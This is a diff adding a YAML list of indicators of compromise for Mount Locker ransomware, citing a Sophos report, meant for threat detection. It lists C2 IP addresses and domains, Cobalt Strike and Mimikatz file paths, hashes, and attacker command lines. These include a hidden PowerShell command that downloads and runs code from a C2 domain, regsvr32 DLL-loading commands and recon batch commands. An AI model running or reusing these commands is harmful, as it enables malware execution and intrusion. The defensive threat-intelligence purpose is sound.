@@ -1,0 +1,117 @@
+- data: IoCs related to Mount Locker ransomware
+  ioc_type: description
+  note: https://news.sophos.com/en-us/2021/03/31/sophos-mtr-in-real-time-what-is-astro-locker-team/
+- data: C:\Windows\system32\cmd.exe" /c powershell.exe -nop -w hidden -c "IEX ((new-object
+    net.webclient).downloadstring('http://supercombinating[.]com:80/bug3'))
+  ioc_type: command
+  note: ''
+- data: regsvr32  yesc64.dll /i:"/log:c"
+  ioc_type: command
+  note: ''
+- data: "regsvr32\_ locker_64.dll\_/i:\"/log:c\""
+  ioc_type: command
+  note: ''
+- data: "regsvr32.exe /i\_c:\\Users\\<username>\\Music\\archs64.dll"
+  ioc_type: command
+  note: ''
+- data: regsvr32.exe /s "C:\Users\<username>\AppData\Local\Temp\diloay.dll"
+  ioc_type: command
+  note: ''
+- data: 104.244.42.129
+  ioc_type: domain
+  note: C2 server
+- data: 139.60.162.19
+  ioc_type: domain
+  note: C2 server
+- data: 143.110.185.84
+  ioc_type: domain
+  note: C2 server
+- data: 185.162.235.61
+  ioc_type: domain
+  note: C2 server
+- data: 206.189.56.140
+  ioc_type: domain
+  note: C2 server
+- data: 31.13.93.174
+  ioc_type: domain
+  note: C2 server
+- data: 31.13.93.35
+  ioc_type: domain
+  note: C2 server
+- data: 52.204.190.157
+  ioc_type: domain
+  note: C2 server
+- data: felpojdhf8980.cyou
+  ioc_type: domain
+  note: C2 server
+- data: supercombinating.com
+  ioc_type: domain
+  note: C2 server
+- data: Keatuxnf.dll
+  ioc_type: filename
+  note: Cobalt Strike
+- data: locker_64.dll
+  ioc_type: filename
+  note: Mount Locker ransomware
+- data: niicok.dll
+  ioc_type: filename
+  note: Cobalt Strike
+- data: RecoveryManual.html
+  ioc_type: filename
+  note: Ransom note
+- data: C:\inetpub\locker_64.dll
+  ioc_type: filepath
+  note: Mount Locker ransomware
+- data: C:\Users\<username>\AppData\Local\Temp\diloay.dll
+  ioc_type: filepath
+  note: Cobalt Strike
+- data: C:\Users\<username>\AppData\Local\Temp\miavan32.dll
+  ioc_type: filepath
+  note: Cobalt Strike
+- data: C:\Users\<username>\Music\x64\mimikatz.exe
+  ioc_type: filepath
+  note: Mimikatz
+- data: C:\Users\<username>\yesc64.dll
+  ioc_type: filepath
+  note: Mount Locker ransomware
+- data: C:\Windows\ar664hs.dll
+  ioc_type: filepath
+  note: Cobalt Strike
+- data: C:\windows\locker_64.dll
+  ioc_type: filepath
+  note: Mount Locker ransomware
+- data: C:\Windows\SysWOW64\exploer.exe
+  ioc_type: filepath
+  note: Cobalt Strike
+- data: C:\Users\<username>\AppData\Local\Google\Chrome\User Data\FileTypePolicies\archs64.dll
+  ioc_type: scheduled task
+  note: 'Name: updater'
+- data: "regsvr32.exe /i\_c:\\Users\\<username>\\Music\\archs64.dll"
+  ioc_type: scheduled task
+  note: 'Name: regsvr32'
+- data: regsvr32.exe C:\Users\<username>\Music\archs64 regsvr32.exe /i
+  ioc_type: scheduled task
+  note: 'Name: updater'
+- data: '%COMSPEC% /C "whoami"'
+  ioc_type: service
+  note: Named with random 16-digit string
+- data: "%COMSPEC% /C echo wmic\_logicaldisk\_get\_description,name\_^> %SYSTEMDRIVE%\\\
+    WINDOWS\\Temp\\CIrmjHmIzofVNjPd.txt > \\WINDOWS\\Temp\\KmsVUcNomePVWphR.bat &\
+    \ %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\KmsVUcNomePVWphR.bat"
+  ioc_type: service
+  note: Named with random 16-digit string
+- data: "%COMSPEC% /C echo\_whoami\_^>\_ZSYSTEMDRIVE%\\WINDOWS\\Temp\\pkLneFsUyHywlUwZ.txt\
+    \ > \\WINDOWS\\Temp\\sloKuaTCIYlTTPwM.bat & %COMSPEC% /C start %COMSPEC% /C \\\
+    WINDOWS\\Temp\\sloKuaTCIYlTTPwM.bat"
+  ioc_type: service
+  note: Named with random 16-digit string
+- data: 30ff38e859a849b6776dd7b0f299ba83605858f661297f39585bcf928769feef
+  ioc_type: sha256
+  note: Cobalt Strike
+- data: 5606c92af263869268a11eb730eb32d5fd770896530b23e42d2390d6ef230d61
+  ioc_type: sha256
+  note: Mount Locker ransomware DLL
+- data: 864930113d66c413bab705e79add3659efa95126449bfad05abf99c6d7e8ae00
+  ioc_type: sha256
+  note: Cobalt Strike
+
